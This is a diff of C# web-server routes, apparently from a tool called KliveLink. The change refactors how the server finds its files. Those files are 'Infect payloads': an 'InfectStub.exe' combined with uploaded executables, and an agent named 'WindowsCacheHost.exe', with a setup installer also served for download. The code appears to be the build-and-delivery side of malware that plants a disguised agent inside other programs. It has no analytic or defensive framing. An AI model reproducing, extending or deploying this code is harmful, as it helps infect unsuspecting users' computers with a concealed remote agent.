@@ -1,4 +1,4 @@
-using System.Net;
+﻿using System.Net;
 using System.Net.WebSockets;
 using System.Text;
 using System.Text.Json;
@@ -341,10 +341,10 @@ public sealed class KliveLinkV2Routes
                 byte[] original = req.userMessageBytes ?? Array.Empty<byte>();
                 if (original.Length < 2) { await Bad(req, "EXE body required"); return; }
                 string baseDir = AppDomain.CurrentDomain.BaseDirectory;
-                string stubPath = Path.Combine(baseDir, "InfectStub.exe");
-                string agentPath = Path.Combine(baseDir, "WindowsCacheHost.exe");
-                string configPath = Path.Combine(baseDir, "klive.config.json");
-                if (!File.Exists(stubPath) || !File.Exists(agentPath) || !File.Exists(configPath))
+                string? stubPath = KliveLinkAssetLocator.Find("InfectStub.exe");
+                string? agentPath = KliveLinkAssetLocator.Find("WindowsCacheHost.exe");
+                string? configPath = KliveLinkAssetLocator.Find("klive.config.json");
+                if (string.IsNullOrWhiteSpace(stubPath) || string.IsNullOrWhiteSpace(agentPath) || string.IsNullOrWhiteSpace(configPath) || !File.Exists(stubPath) || !File.Exists(agentPath) || !File.Exists(configPath))
                 {
                     await req.ReturnResponse("Infect payloads missing on server (InfectStub.exe, WindowsCacheHost.exe, klive.config.json).",
                         "text/plain", null, HttpStatusCode.ServiceUnavailable);
@@ -390,8 +390,8 @@ public sealed class KliveLinkV2Routes
         {
             try
             {
-                string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "WindowsCacheHostSetup.exe");
-                if (!File.Exists(path)) { await req.ReturnResponse("Installer not found", code: HttpStatusCode.NotFound); return; }
+                string? path = KliveLinkAssetLocator.Find("WindowsCacheHostSetup.exe");
+                if (string.IsNullOrWhiteSpace(path) || !File.Exists(path)) { await req.ReturnResponse("Installer not found", code: HttpStatusCode.NotFound); return; }
                 byte[] bytes = await File.ReadAllBytesAsync(path);
                 var headers = new System.Collections.Specialized.NameValueCollection
                 {
@@ -406,8 +406,8 @@ public sealed class KliveLinkV2Routes
         {
             try
             {
-                string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "WindowsCacheHostSetup.exe");
-                if (!File.Exists(path)) { await req.ReturnResponse("Installer not found", code: HttpStatusCode.NotFound); return; }
+                string? path = KliveLinkAssetLocator.Find("WindowsCacheHostSetup.exe");
+                if (string.IsNullOrWhiteSpace(path) || !File.Exists(path)) { await req.ReturnResponse("Installer not found", code: HttpStatusCode.NotFound); return; }
                 byte[] bytes = await File.ReadAllBytesAsync(path);
                 var headers = new System.Collections.Specialized.NameValueCollection
                 {
@@ -618,6 +618,7 @@ public sealed class KliveLinkV2Routes
     private static async Task Fail(Omnipotent.Services.KliveAPI.KliveAPI.UserRequest req, Exception ex)
         => await req.ReturnResponse(JsonConvert.SerializeObject(new { error = ex.Message }), "application/json", null, HttpStatusCode.InternalServerError);
 }
+
 
 
 
